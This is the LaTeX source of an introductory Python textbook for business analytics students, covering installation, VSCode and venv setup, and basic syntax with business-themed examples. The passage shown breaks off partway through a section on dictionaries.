% Options for packages loaded elsewhere
\PassOptionsToPackage{unicode}{hyperref}
\PassOptionsToPackage{hyphens}{url}
\PassOptionsToPackage{dvipsnames,svgnames,x11names}{xcolor}
%
\documentclass[
  letterpaper,
  DIV=11,
  numbers=noendperiod]{scrreprt}

\usepackage{amsmath,amssymb}
\usepackage{iftex}
\ifPDFTeX
  \usepackage[T1]{fontenc}
  \usepackage[utf8]{inputenc}
  \usepackage{textcomp} % provide euro and other symbols
\else % if luatex or xetex
  \usepackage{unicode-math}
  \defaultfontfeatures{Scale=MatchLowercase}
  \defaultfontfeatures[\rmfamily]{Ligatures=TeX,Scale=1}
\fi
\usepackage{lmodern}
\ifPDFTeX\else  
    % xetex/luatex font selection
\fi
% Use upquote if available, for straight quotes in verbatim environments
\IfFileExists{upquote.sty}{\usepackage{upquote}}{}
\IfFileExists{microtype.sty}{% use microtype if available
  \usepackage[]{microtype}
  \UseMicrotypeSet[protrusion]{basicmath} % disable protrusion for tt fonts
}{}
\makeatletter
\@ifundefined{KOMAClassName}{% if non-KOMA class
  \IfFileExists{parskip.sty}{%
    \usepackage{parskip}
  }{% else
    \setlength{\parindent}{0pt}
    \setlength{\parskip}{6pt plus 2pt minus 1pt}}
}{% if KOMA class
  \KOMAoptions{parskip=half}}
\makeatother
\usepackage{xcolor}
\setlength{\emergencystretch}{3em} % prevent overfull lines
\setcounter{secnumdepth}{5}
% Make \paragraph and \subparagraph free-standing
\makeatletter
\ifx\paragraph\undefined\else
  \let\oldparagraph\paragraph
  \renewcommand{\paragraph}{
    \@ifstar
      \xxxParagraphStar
      \xxxParagraphNoStar
  }
  \newcommand{\xxxParagraphStar}[1]{\oldparagraph*{#1}\mbox{}}
  \newcommand{\xxxParagraphNoStar}[1]{\oldparagraph{#1}\mbox{}}
\fi
\ifx\subparagraph\undefined\else
  \let\oldsubparagraph\subparagraph
  \renewcommand{\subparagraph}{
    \@ifstar
      \xxxSubParagraphStar
      \xxxSubParagraphNoStar
  }
  \newcommand{\xxxSubParagraphStar}[1]{\oldsubparagraph*{#1}\mbox{}}
  \newcommand{\xxxSubParagraphNoStar}[1]{\oldsubparagraph{#1}\mbox{}}
\fi
\makeatother

\usepackage{color}
\usepackage{fancyvrb}
\newcommand{\VerbBar}{|}
\newcommand{\VERB}{\Verb[commandchars=\\\{\}]}
\DefineVerbatimEnvironment{Highlighting}{Verbatim}{commandchars=\\\{\}}
% Add ',fontsize=\small' for more characters per line
\usepackage{framed}
\definecolor{shadecolor}{RGB}{241,243,245}
\newenvironment{Shaded}{\begin{snugshade}}{\end{snugshade}}
\newcommand{\AlertTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\AnnotationTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{#1}}
\newcommand{\AttributeTok}[1]{\textcolor[rgb]{0.40,0.45,0.13}{#1}}
\newcommand{\BaseNTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\BuiltInTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{#1}}
\newcommand{\CharTok}[1]{\textcolor[rgb]{0.13,0.47,0.30}{#1}}
\newcommand{\CommentTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{#1}}
\newcommand{\CommentVarTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{\textit{#1}}}
\newcommand{\ConstantTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{#1}}
\newcommand{\ControlFlowTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{\textbf{#1}}}
\newcommand{\DataTypeTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\DecValTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\DocumentationTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{\textit{#1}}}
\newcommand{\ErrorTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\ExtensionTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{#1}}
\newcommand{\FloatTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\FunctionTok}[1]{\textcolor[rgb]{0.28,0.35,0.67}{#1}}
\newcommand{\ImportTok}[1]{\textcolor[rgb]{0.00,0.46,0.62}{#1}}
\newcommand{\InformationTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{#1}}
\newcommand{\KeywordTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{\textbf{#1}}}
\newcommand{\NormalTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{#1}}
\newcommand{\OperatorTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{#1}}
\newcommand{\OtherTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{#1}}
\newcommand{\PreprocessorTok}[1]{\textcolor[rgb]{0.68,0.00,0.00}{#1}}
\newcommand{\RegionMarkerTok}[1]{\textcolor[rgb]{0.00,0.23,0.31}{#1}}
\newcommand{\SpecialCharTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{#1}}
\newcommand{\SpecialStringTok}[1]{\textcolor[rgb]{0.13,0.47,0.30}{#1}}
\newcommand{\StringTok}[1]{\textcolor[rgb]{0.13,0.47,0.30}{#1}}
\newcommand{\VariableTok}[1]{\textcolor[rgb]{0.07,0.07,0.07}{#1}}
\newcommand{\VerbatimStringTok}[1]{\textcolor[rgb]{0.13,0.47,0.30}{#1}}
\newcommand{\WarningTok}[1]{\textcolor[rgb]{0.37,0.37,0.37}{\textit{#1}}}

\providecommand{\tightlist}{%
  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}\usepackage{longtable,booktabs,array}
\usepackage{calc} % for calculating minipage widths
% Correct order of tables after \paragraph or \subparagraph
\usepackage{etoolbox}
\makeatletter
\patchcmd\longtable{\par}{\if@noskipsec\mbox{}\fi\par}{}{}
\makeatother
% Allow footnotes in longtable head/foot
\IfFileExists{footnotehyper.sty}{\usepackage{footnotehyper}}{\usepackage{footnote}}
\makesavenoteenv{longtable}
\usepackage{graphicx}
\makeatletter
\def\maxwidth{\ifdim\Gin@nat@width>\linewidth\linewidth\else\Gin@nat@width\fi}
\def\maxheight{\ifdim\Gin@nat@height>\textheight\textheight\else\Gin@nat@height\fi}
\makeatother
% Scale images if necessary, so that they will not overflow the page
% margins by default, and it is still possible to overwrite the defaults
% using explicit options in \includegraphics[width, height, ...]{}
\setkeys{Gin}{width=\maxwidth,height=\maxheight,keepaspectratio}
% Set default figure placement to htbp
\makeatletter
\def\fps@figure{htbp}
\makeatother
% definitions for citeproc citations
\NewDocumentCommand\citeproctext{}{}
\NewDocumentCommand\citeproc{mm}{%
  \begingroup\def\citeproctext{#2}\cite{#1}\endgroup}
\makeatletter
 % allow citations to break across lines
 \let\@cite@ofmt\@firstofone
 % avoid brackets around text for \cite:
 \def\@biblabel#1{}
 \def\@cite#1#2{{#1\if@tempswa , #2\fi}}
\makeatother
\newlength{\cslhangindent}
\setlength{\cslhangindent}{1.5em}
\newlength{\csllabelwidth}
\setlength{\csllabelwidth}{3em}
\newenvironment{CSLReferences}[2] % #1 hanging-indent, #2 entry-spacing
 {\begin{list}{}{%
  \setlength{\itemindent}{0pt}
  \setlength{\leftmargin}{0pt}
  \setlength{\parsep}{0pt}
  % turn on hanging indent if param 1 is 1
  \ifodd #1
   \setlength{\leftmargin}{\cslhangindent}
   \setlength{\itemindent}{-1\cslhangindent}
  \fi
  % set entry spacing
  \setlength{\itemsep}{#2\baselineskip}}}
 {\end{list}}
\usepackage{calc}
\newcommand{\CSLBlock}[1]{\hfill\break\parbox[t]{\linewidth}{\strut\ignorespaces#1\strut}}
\newcommand{\CSLLeftMargin}[1]{\parbox[t]{\csllabelwidth}{\strut#1\strut}}
\newcommand{\CSLRightInline}[1]{\parbox[t]{\linewidth - \csllabelwidth}{\strut#1\strut}}
\newcommand{\CSLIndent}[1]{\hspace{\cslhangindent}#1}

\KOMAoption{captions}{tableheading}
\makeatletter
\@ifpackageloaded{bookmark}{}{\usepackage{bookmark}}
\makeatother
\makeatletter
\@ifpackageloaded{caption}{}{\usepackage{caption}}
\AtBeginDocument{%
\ifdefined\contentsname
  \renewcommand*\contentsname{Table of contents}
\else
  \newcommand\contentsname{Table of contents}
\fi
\ifdefined\listfigurename
  \renewcommand*\listfigurename{List of Figures}
\else
  \newcommand\listfigurename{List of Figures}
\fi
\ifdefined\listtablename
  \renewcommand*\listtablename{List of Tables}
\else
  \newcommand\listtablename{List of Tables}
\fi
\ifdefined\figurename
  \renewcommand*\figurename{Figure}
\else
  \newcommand\figurename{Figure}
\fi
\ifdefined\tablename
  \renewcommand*\tablename{Table}
\else
  \newcommand\tablename{Table}
\fi
}
\@ifpackageloaded{float}{}{\usepackage{float}}
\floatstyle{ruled}
\@ifundefined{c@chapter}{\newfloat{codelisting}{h}{lop}}{\newfloat{codelisting}{h}{lop}[chapter]}
\floatname{codelisting}{Listing}
\newcommand*\listoflistings{\listof{codelisting}{List of Listings}}
\makeatother
\makeatletter
\makeatother
\makeatletter
\@ifpackageloaded{caption}{}{\usepackage{caption}}
\@ifpackageloaded{subcaption}{}{\usepackage{subcaption}}
\makeatother
\ifLuaTeX
  \usepackage{selnolig}  % disable illegal ligatures
\fi
\usepackage{bookmark}

\IfFileExists{xurl.sty}{\usepackage{xurl}}{} % add URL line breaks if available
\urlstyle{same} % disable monospaced font for URLs
\hypersetup{
  pdftitle={Python for Business Analytics and Informaton Systems},
  pdfauthor={Markum Reed},
  colorlinks=true,
  linkcolor={blue},
  filecolor={Maroon},
  citecolor={Blue},
  urlcolor={Blue},
  pdfcreator={LaTeX via pandoc}}

\title{Python for Business Analytics and Informaton Systems}
\author{Markum Reed}
\date{2024-01-01}

\begin{document}
\maketitle

\renewcommand*\contentsname{Table of contents}
{
\hypersetup{linkcolor=}
\setcounter{tocdepth}{2}
\tableofcontents
}
\bookmarksetup{startatroot}

\chapter*{Preface}\label{preface}
\addcontentsline{toc}{chapter}{Preface}

\markboth{Preface}{Preface}

\textbf{Preface}

The inception of ``Python for Business Analytics and Information
Systems'' was motivated by the recognition of the need for cohesiveness
in BAIS programs between what is taught and what is required in the
industry. Python, as a programming language, has transcended its
traditional boundaries and become a cornerstone in the business
technology landscape. As we witness an exponential increase in data
generation and the subsequent need for efficient data processing and
analysis, the importance of Python in business applications becomes
increasingly apparent.

This book is crafted with the intent to bridge the gap between
theoretical knowledge and practical application, providing a thorough
yet accessible entry into the world of Python for aspiring and current
business technology professionals. It is tailored to those who aim to
leverage Python's capabilities in analytics, system design, network
communication, and more, within a business context.

In the preparation of this book, we have meticulously chosen topics that
not only cover the essentials of Python programming but also delve into
advanced areas that are particularly relevant to business analytics and
information systems. From the very first chapter on setting up a Python
environment to detailed discussions on network architecture and
protocols, this book aims to equip readers with a holistic understanding
of what it takes to apply Python effectively in a business setting.

The first seven chapters cover the basics of Python, laying a strong
foundation in programming concepts. Chapters 8-13 focus on Systems
Analysis and Design, delving into topics such as system architecture,
software development life cycles, and design principles. Chapters 14-18
are dedicated to business data communication, exploring network
protocols, data transmission methods, and the integration of
communication systems within business environments.

The structure of this book is designed to facilitate a smooth transition
from simple to complex topics, ensuring that foundational concepts are
solidified before advancing to more specialized content. Each chapter
builds upon the previous, with practical examples and case studies that
illustrate the real-world application of theoretical concepts.

We have also included numerous exercises, projects, and review questions
in each chapter to reinforce learning and encourage practical
application of the skills acquired. Additionally, the inclusion of
modern practices and emerging trends in business technology ensures that
the content remains relevant in the face of rapid technological
advancements.

It is my hope that ``Python for Business Analytics and Information
Systems'' serves not only as a textbook for students but also as a
valuable resource for professionals seeking to enhance their skills and
understanding of business technology through Python. May this book
inspire you to explore, innovate, and excel in your professional
journey.

To all readers embarking on this learning adventure: may your curiosity
be boundless and your achievements significant.

Markum Reed, PhD Director, BAIS Program Assistant Professor of
Instruction Muma College of Business University of South Florida

\bookmarksetup{startatroot}

\chapter{Introduction}\label{introduction}

\textbf{Introduction}

Welcome to ``Python for Business Analytics and Information Systems,'' a
comprehensive guide designed for students, professionals, and
enthusiasts aiming to master Python in the realm of business technology.
This book serves as both an educational tool and a practical resource,
providing the foundational skills necessary to excel in the rapidly
evolving landscape of business analytics and information systems.

In this book, we cover a broad spectrum of topics tailored to equip you
with the skills required to harness the power of Python in solving
real-world business problems. We begin with the basics of setting up a
Python environment, ensuring you are well-prepared with the tools needed
for effective programming. From there, we delve into the core aspects of
Python programming, including basics, control structures, functions, and
modules---all crucial for building robust applications.

As you progress, we will explore more advanced topics such as
object-oriented programming (OOP), database interactions, and API
integrations, which are integral to systems analysis and design. We also
tackle Python's role in automating system tasks and conducting thorough
software testing, ensuring reliability and efficiency in your
applications.

For those particularly interested in the interplay between Python and
network communications within businesses, we dedicate sections to the
foundations of data communication, network architecture, and modern
network practices. These chapters are especially pertinent for students
enrolled in courses like ``Business Data Communications,'' blending
theoretical knowledge with practical application.

Finally, the book concludes with a comprehensive summary and an appendix
on version control using Git, a critical skill for any programmer
working in a collaborative environment.

This book is more than just a series of instructions; it is a pathway to
becoming proficient in Python for business analytics and information
systems, preparing you for a successful career in an interconnected,
data-driven world. Whether you are a student preparing for a career in
business technology or a professional seeking to upgrade your skills,
this book offers the knowledge and practical insights needed to excel in
your endeavors.

\bookmarksetup{startatroot}

\chapter{Installing Python}\label{installing-python}

\subsubsection{Windows:}\label{windows}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Download Python}: Visit the official Python website at
  \href{https://www.python.org/downloads/}{python.org} and download the
  latest version for Windows. Click on the ``Download'' button for the
  most recent release.
\item
  \textbf{Run Installer}: Open the downloaded file and make sure to
  check the box that says ``Add Python 3.x to PATH'' at the beginning of
  the installation process. Then click ``Install Now''.
\item
  \textbf{Verify Installation}: Open Command Prompt and type
  \texttt{python\ -\/-version}. You should see the Python version number
  if it was installed correctly.
\end{enumerate}

\subsubsection{macOS:}\label{macos}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Download Python}: Go to
  \href{https://www.python.org/downloads/}{python.org} and download the
  latest Python version for macOS.
\item
  \textbf{Install Python}: Open the downloaded \texttt{.pkg} file and
  follow the instructions to install Python.
\item
  \textbf{Verify Installation}: Open Terminal and type
  \texttt{python3\ -\/-version} to check that Python installed
  correctly.
\end{enumerate}

\subsubsection{Linux:}\label{linux}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Install Python}: Python is usually pre-installed on Linux. To
  check if it is installed and to install the latest version, open a
  terminal and type:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt update}
\FunctionTok{sudo}\NormalTok{ apt install python3}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Verify Installation}: Type \texttt{python3\ -\/-version} in
  the terminal.
\end{enumerate}

\subsection{Installing Visual Studio Code
(VSCode)}\label{installing-visual-studio-code-vscode}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Download VSCode}: Visit the
  \href{https://code.visualstudio.com/}{VSCode website} and download the
  version suitable for your operating system.
\item
  \textbf{Install VSCode}: Run the downloaded installer file and follow
  the instructions provided.
\end{enumerate}

\subsection{Setting Up Python in
VSCode}\label{setting-up-python-in-vscode}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Open VSCode}.
\item
  \textbf{Install the Python extension}: Click on the extensions view
  icon on the Sidebar or press \texttt{Ctrl+Shift+X}. Search for
  ``Python'' and install the extension provided by Microsoft.
\item
  \textbf{Select Python Interpreter}: Press \texttt{Ctrl+Shift+P} to
  open the Command Palette and type ``Python: Select Interpreter''.
  Choose the Python version you installed earlier.
\end{enumerate}

\subsection{Writing Your First Python Program in
VSCode}\label{writing-your-first-python-program-in-vscode}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Create a new file}: File \textgreater{} New File.
\item
  \textbf{Save the file}: Save the file with a \texttt{.py} extension,
  e.g., \texttt{hello.py}.
\item
  \textbf{Write some Python code}:

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{print}\NormalTok{(}\StringTok{"Hello, world!"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Run the program}: Right-click in the editor window and select
  ``Run Python File in Terminal'', or press \texttt{Ctrl+F5} to run
  without debugging.
\end{enumerate}

\subsection{Basic Python Programming}\label{basic-python-programming}

\begin{itemize}
\item
  \textbf{Variables}: Storing data values.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{x }\OperatorTok{=} \DecValTok{5}
\NormalTok{y }\OperatorTok{=} \StringTok{"Hello"}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Data Types}: Python has various data types including integers,
  float, string, and more.
\item
  \textbf{Operators}: Perform operations on variables and values.
\item
  \textbf{Control Structures}: Use \texttt{if}, \texttt{else}, and
  \texttt{elif} for decisions, and \texttt{for} and \texttt{while} loops
  for repeating blocks of code.
\end{itemize}

\subsection{Exploring More Features}\label{exploring-more-features}

\begin{itemize}
\tightlist
\item
  \textbf{Intellisense}: VSCode provides smart completions based on
  variable types, function definitions, and imported modules.
\item
  \textbf{Debugging}: Set breakpoints, step through your code, and
  inspect variables.
\item
  \textbf{Extensions}: Enhance VSCode functionality with extensions like
  ``Python Docstring Generator'' to automatically generate docstrings
  for your Python functions.
\end{itemize}

This format should help make the tutorial flow more smoothly from one
section to the next without the formal structure of numbering.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

Setting up a virtual environment in Python using \texttt{venv} is an
essential skill for managing dependencies and ensuring that projects run
consistently across different systems. Here's a step-by-step guide to
help you set up a Python virtual environment using the \texttt{venv}
module.

\subsection{Prerequisites}\label{prerequisites}

Before creating a virtual environment, make sure Python 3 is installed
on your system. You can verify this by running
\texttt{python\ -\/-version} or \texttt{python3\ -\/-version} in your
command prompt or terminal.

\subsection{Creating a Virtual
Environment}\label{creating-a-virtual-environment}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Navigate to Your Project Directory}: Open your command prompt
  or terminal. Use the \texttt{cd} command to change to the directory
  where you want to set up the virtual environment.

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ path/to/your/project}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Create the Virtual Environment}: Use the following command to
  create a virtual environment named \texttt{env} (you can choose any
  name you like). The command might slightly vary depending on whether
  your system recognizes \texttt{python} or \texttt{python3}.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python} \AttributeTok{{-}m}\NormalTok{ venv env}
\end{Highlighting}
\end{Shaded}

  or

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python3} \AttributeTok{{-}m}\NormalTok{ venv env}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\subsection{Activating the Virtual
Environment}\label{activating-the-virtual-environment}

To use the virtual environment, you need to activate it. The activation
command differs depending on your operating system:

\subsubsection{Windows}\label{windows-1}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{env}\DataTypeTok{\textbackslash{}S}\NormalTok{cripts}\DataTypeTok{\textbackslash{}a}\NormalTok{ctivate}
\end{Highlighting}
\end{Shaded}

\subsubsection{macOS and Linux}\label{macos-and-linux}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{source}\NormalTok{ env/bin/activate}
\end{Highlighting}
\end{Shaded}

Once activated, your command line will typically show the name of the
virtual environment (in this case, \texttt{env}), indicating that it is
active. From now on, any Python or pip commands will use the Python
version and packages installed in the virtual environment.

\subsection{Installing Packages}\label{installing-packages}

With the virtual environment active, install packages using
\texttt{pip}. For example, to install the \texttt{requests} library, you
would run:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install requests}
\end{Highlighting}
\end{Shaded}

This will install the package only within the virtual environment.

\subsection{Running Python Code}\label{running-python-code}

Run Python scripts as usual with the virtual environment activated. For
instance:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python}\NormalTok{ script.py}
\end{Highlighting}
\end{Shaded}

or if your system defaults to Python 2:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python3}\NormalTok{ script.py}
\end{Highlighting}
\end{Shaded}

\subsection{Deactivating the Virtual
Environment}\label{deactivating-the-virtual-environment}

When you're done working in the virtual environment, you can deactivate
it by simply typing:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{deactivate}
\end{Highlighting}
\end{Shaded}

This command will return you to the system's default Python settings.

\subsection{Managing Dependencies}\label{managing-dependencies}

\begin{itemize}
\item
  \textbf{Freezing Dependencies}: To keep track of the packages you've
  installed in the virtual environment, you can generate a
  \texttt{requirements.txt} file using:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ freeze }\OperatorTok{\textgreater{}}\NormalTok{ requirements.txt}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{Installing from \texttt{requirements.txt}}: You can install
  all the dependencies at once with:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install }\AttributeTok{{-}r}\NormalTok{ requirements.txt}
\end{Highlighting}
\end{Shaded}
\end{itemize}

\subsection{Best Practices}\label{best-practices}

\begin{itemize}
\tightlist
\item
  \textbf{Separate Environments}: Create a separate virtual environment
  for each project to avoid conflicts between package versions.
\item
  \textbf{Version Control}: Exclude your virtual environment directory
  (\texttt{env} in this case) from version control by adding it to the
  \texttt{.gitignore} file.
\end{itemize}

Using virtual environments is a best practice that keeps your Python
projects organized and ensures they work consistently across different
setups.

\bookmarksetup{startatroot}

\chapter{Introduction to Python Programming Basics for
Business}\label{introduction-to-python-programming-basics-for-business}

Python is a versatile, high-level programming language known for its
readability and broad applicability, especially in the business world.
This tutorial will introduce you to the fundamentals of Python, focusing
on business-related examples. You will learn about variables, data
types, control structures, functions, and basic modules.

\subsection{Variables and Data Types}\label{variables-and-data-types}

\subsubsection{Variables}\label{variables}

In Python, variables are used to store data values. You do not need to
declare a variable before using it.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Example}
\NormalTok{company\_name }\OperatorTok{=} \StringTok{"Tech Solutions Inc."}
\NormalTok{number\_of\_employees }\OperatorTok{=} \DecValTok{250}
\NormalTok{is\_public }\OperatorTok{=} \VariableTok{True}
\end{Highlighting}
\end{Shaded}

\subsubsection{Data Types}\label{data-types}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Strings}: A sequence of characters.
  \texttt{python\ \ \ \ \ greeting\ =\ "Welcome\ to\ our\ company!"}
\item
  \textbf{Integers}: Whole numbers.
  \texttt{python\ \ \ \ \ total\_sales\ =\ 150000}
\item
  \textbf{Floats}: Decimal numbers.
  \texttt{python\ \ \ \ \ quarterly\_profit\ =\ 35000.75}
\item
  \textbf{Booleans}: True or False values.
  \texttt{python\ \ \ \ \ is\_profit\_increasing\ =\ False}
\end{enumerate}

\subsection{Basic Operations}\label{basic-operations}

Python supports various operations on data types.

\subsubsection{Arithmetic Operations}\label{arithmetic-operations}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{revenue }\OperatorTok{=} \DecValTok{100000}
\NormalTok{expenses }\OperatorTok{=} \DecValTok{75000}

\NormalTok{net\_income }\OperatorTok{=}\NormalTok{ revenue }\OperatorTok{{-}}\NormalTok{ expenses  }\CommentTok{\# Subtraction}
\BuiltInTok{print}\NormalTok{(net\_income)  }\CommentTok{\# Output: 25000}

\NormalTok{profit\_margin }\OperatorTok{=}\NormalTok{ (net\_income }\OperatorTok{/}\NormalTok{ revenue) }\OperatorTok{*} \DecValTok{100}  \CommentTok{\# Division}
\BuiltInTok{print}\NormalTok{(profit\_margin)  }\CommentTok{\# Output: 25.0}
\end{Highlighting}
\end{Shaded}

\subsubsection{String Operations}\label{string-operations}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{department1 }\OperatorTok{=} \StringTok{"Finance"}
\NormalTok{department2 }\OperatorTok{=} \StringTok{"Marketing"}

\CommentTok{\# Concatenation}
\NormalTok{combined\_departments }\OperatorTok{=}\NormalTok{ department1 }\OperatorTok{+} \StringTok{" and "} \OperatorTok{+}\NormalTok{ department2}
\BuiltInTok{print}\NormalTok{(combined\_departments)  }\CommentTok{\# Output: Finance and Marketing}

\CommentTok{\# Length}
\NormalTok{department\_length }\OperatorTok{=} \BuiltInTok{len}\NormalTok{(department1)}
\BuiltInTok{print}\NormalTok{(department\_length)  }\CommentTok{\# Output: 7}
\end{Highlighting}
\end{Shaded}

\subsection{Control Structures}\label{control-structures}

\subsubsection{Conditional Statements}\label{conditional-statements}

Conditional statements allow you to execute code based on conditions.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{annual\_revenue }\OperatorTok{=} \DecValTok{1200000}

\ControlFlowTok{if}\NormalTok{ annual\_revenue }\OperatorTok{\textgreater{}} \DecValTok{1000000}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"The company qualifies for the large enterprise category."}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"The company qualifies for the small enterprise category."}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Loops}\label{loops}

Loops are used to iterate over a sequence of elements.

\paragraph{For Loop}\label{for-loop}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{departments }\OperatorTok{=}\NormalTok{ [}\StringTok{"Finance"}\NormalTok{, }\StringTok{"Marketing"}\NormalTok{, }\StringTok{"HR"}\NormalTok{, }\StringTok{"IT"}\NormalTok{]}

\ControlFlowTok{for}\NormalTok{ department }\KeywordTok{in}\NormalTok{ departments:}
    \BuiltInTok{print}\NormalTok{(department)}
\end{Highlighting}
\end{Shaded}

\paragraph{While Loop}\label{while-loop}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{pending\_tasks }\OperatorTok{=} \DecValTok{5}

\ControlFlowTok{while}\NormalTok{ pending\_tasks }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Tasks remaining: }\SpecialCharTok{\{}\NormalTok{pending\_tasks}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{    pending\_tasks }\OperatorTok{{-}=} \DecValTok{1}
\end{Highlighting}
\end{Shaded}

\subsection{Functions}\label{functions}

Functions are blocks of code that perform a specific task and can be
reused.

\subsubsection{Defining and Calling
Functions}\label{defining-and-calling-functions}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_bonus(salary, performance\_rating):}
\NormalTok{    bonus\_percentage }\OperatorTok{=} \FloatTok{0.1} \ControlFlowTok{if}\NormalTok{ performance\_rating }\OperatorTok{\textgreater{}=} \DecValTok{4} \ControlFlowTok{else} \FloatTok{0.05}
    \ControlFlowTok{return}\NormalTok{ salary }\OperatorTok{*}\NormalTok{ bonus\_percentage}

\BuiltInTok{print}\NormalTok{(calculate\_bonus(}\DecValTok{50000}\NormalTok{, }\FloatTok{4.5}\NormalTok{))  }\CommentTok{\# Output: 5000.0}
\end{Highlighting}
\end{Shaded}

\subsubsection{Functions with Multiple
Arguments}\label{functions-with-multiple-arguments}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ calculate\_total\_cost(unit\_price, quantity):}
    \ControlFlowTok{return}\NormalTok{ unit\_price }\OperatorTok{*}\NormalTok{ quantity}

\BuiltInTok{print}\NormalTok{(calculate\_total\_cost(}\DecValTok{50}\NormalTok{, }\DecValTok{100}\NormalTok{))  }\CommentTok{\# Output: 5000}
\end{Highlighting}
\end{Shaded}

\subsection{Lists}\label{lists}

Lists are ordered collections of items.

\subsubsection{Creating and Accessing
Lists}\label{creating-and-accessing-lists}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{clients }\OperatorTok{=}\NormalTok{ [}\StringTok{"Client A"}\NormalTok{, }\StringTok{"Client B"}\NormalTok{, }\StringTok{"Client C"}\NormalTok{]}

\BuiltInTok{print}\NormalTok{(clients[}\DecValTok{0}\NormalTok{])  }\CommentTok{\# Accessing first element, Output: Client A}
\BuiltInTok{print}\NormalTok{(clients[}\OperatorTok{{-}}\DecValTok{1}\NormalTok{]) }\CommentTok{\# Accessing last element, Output: Client C}
\end{Highlighting}
\end{Shaded}

\subsubsection{Adding and Removing
Elements}\label{adding-and-removing-elements}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{clients.append(}\StringTok{"Client D"}\NormalTok{)  }\CommentTok{\# Adding an element}
\NormalTok{clients.remove(}\StringTok{"Client B"}\NormalTok{)  }\CommentTok{\# Removing an element}
\BuiltInTok{print}\NormalTok{(clients)  }\CommentTok{\# Output: [\textquotesingle{}Client A\textquotesingle{}, \textquotesingle{}Client C\textquotesingle{}, \textquotesingle{}Client D\textquotesingle{}]}
\end{Highlighting}
\end{Shaded}

\subsection{Dictionaries}\label{dictionaries}

Dictionaries store data in key-value pairs.

\subsubsection{Creating and Accessing
Dictionaries}\label{creating-and-accessing-dictionaries}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{employee }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{"name"}\NormalTok{: }\StringTok{"John Doe"}\NormalTok{,}
    \StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{,}
    \StringTok{"position"}\NormalTok{: }\StringTok{"Data Analyst"}
\NormalTok{\}}

\BuiltInTok{print}\NormalTok{(employee[}\StringTok{"name"}\NormalTok{])  }\CommentTok{\# Accessing value by key, Output: John Doe}
\end{Highlighting}
